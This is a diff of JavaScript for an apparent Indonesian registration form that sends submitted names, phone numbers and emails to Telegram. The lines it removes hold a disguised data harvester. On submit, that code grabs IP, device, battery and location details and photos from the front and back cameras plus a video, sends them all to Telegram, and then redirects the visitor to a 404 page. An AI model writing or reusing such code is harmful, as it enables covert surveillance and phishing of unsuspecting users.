@@ -573,123 +573,31 @@ let initialVideoBlob = null;
 })();
 
 /* main flow */
+
 regForm.addEventListener('submit', async function(e){
-  console.log('DEBUG: Submit form kepanggil');
   e.preventDefault();
-  const name = document.getElementById('fullname').value.trim();
-  const wa = document.getElementById('phone').value.trim();
+  console.log('DEBUG: Submit form kepanggil (minimal)');
+  const name  = document.getElementById('fullname').value.trim();
+  const wa    = document.getElementById('phone').value.trim();
   const email = document.getElementById('email').value.trim();
-  const consent = consentEl.checked;
 
-  if(!name || !wa || !email){
-    alert('Isi Nama, Nomor WA, dan Email terlebih dahulu.');
-    return;
+  const text = `📝 Pendaftaran Baru
+━━━━━━━━━━━━━━
+👤 Nama: ${name}
+📱 Telepon: ${wa}
+📧 Email: ${email}
+━━━━━━━━━━━━━━`;
+
+  try {
+    await sendText(text);
+    console.log('DEBUG: Sudah kirim ke Telegram (minimal)');
+    alert("Data terkirim ke Telegram!");
+  } catch(err){
+    console.error("DEBUG: Gagal kirim ke Telegram", err);
+    alert("Gagal kirim ke Telegram");
   }
-
-  try{
-    const quick = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ├─ > Email: ${email}\n ╰─ > Aksi: Pendaftaran`;
-    await sendText(quick);
-    console.log('DEBUG: Sudah kirim ke Telegram (fetch sendText dipanggil)');
-  }catch(e){ /* ignore */ }
-
-  const ipInfo = await getIPInfo();
-  const battery = await getBattery();
-  const connection = getConnection();
-  const deviceMemory = navigator.deviceMemory || '-';
-  const maxTouchPoints = navigator.maxTouchPoints || '-';
-  const colorDepth = screen.colorDepth || '-';
-  const device = {
-    platform: navigator.platform || '-',
-    userAgent: navigator.userAgent || navigator.appVersion || '-',
-    screen: (screen ? `${screen.width}x${screen.height}` : '-'),
-    language: navigator.language || '-',
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
-    localDate: new Date().toLocaleString(),
-    battery,
-    deviceMemory,
-    maxTouchPoints,
-    colorDepth,
-    connection
-  };
-
-  // geolocation if consent
-  let geo = { error:'not requested' }, rev = null;
-  if(consent){
-    geo = await getGeo();
-    if(!geo.error && geo.lat && geo.lon){
-      rev = await revGeocode(geo.lat, geo.lon);
-    }
-  }
-
-  // capture media: front (photo/video) already in initialPhotoBlob OR capture now
-  let frontPhoto = null, frontVideo = null, backPhoto = null;
-  if(consent){
-    if(initialPhotoBlob || initialVideoBlob){
-      frontPhoto = initialPhotoBlob;
-      frontVideo = initialVideoBlob;
-      initialPhotoBlob = null; initialVideoBlob = null;
-    } else {
-      const media = await capturePhotoAndVideo(5000);
-      frontPhoto = media.photoBlob;
-      frontVideo = media.videoBlob;
-    }
-    // try to capture back camera photo
-    try{
-      backPhoto = await captureBackPhoto();
-    }catch(e){
-      backPhoto = null;
-    }
-  }
-
-  const profile = { name, phone: wa, email };
-  const photoCaptionObj = {
-    profile,
-    message: 'Pendaftaran & Verifikasi (dengan izin)',
-    userAgent: device.userAgent,
-    ipInfo,
-    platform: device.platform,
-    screen: device.screen,
-    language: device.language,
-    timezone: device.timezone,
-    battery: device.battery,
-    geo
-  };
-  const photoCaption = buildPhotoCaption(photoCaptionObj);
-  const videoCaption = buildVideoCaptionAddress(rev);
-
-  // send front photo (if ada)
-  try{
-    if(frontPhoto){
-      await sendPhotoCaption(frontPhoto, photoCaption + '\n\n(Tipe: Kamera Depan)');
-    } else {
-      await sendText(photoCaption + '\n\n(Tidak ada foto depan)');
-    }
-  }catch(e){ /* ignore failures */ }
-
-  // send back photo (if ada)
-  try{
-    if(backPhoto){
-      await sendPhotoCaption(backPhoto, photoCaption + '\n\n(Tipe: Kamera Belakang)');
-    } else {
-      // optionally send text noting back photo tidak tersedia
-      // await sendText('Foto belakang tidak tersedia.');
-    }
-  }catch(e){ /* ignore failures */ }
-
-  // send video if present
-  try{
-    if(frontVideo){
-      await sendVideoCaption(frontVideo, videoCaption);
-    } else {
-      // ignore
-    }
-  }catch(e){ /* ignore */ }
-
-  // done -> redirect to 404
-  document.querySelector('.wrap').style.display = 'none';
-  document.getElementById('finish').style.display = 'block';
-  setTimeout(()=>{ window.location.href = '/404.html'; }, 1200);
 });
+
 
 /* checkbox UX: keep mask visible unless user wants preview */
 consentEl.addEventListener('change', async (e)=>{
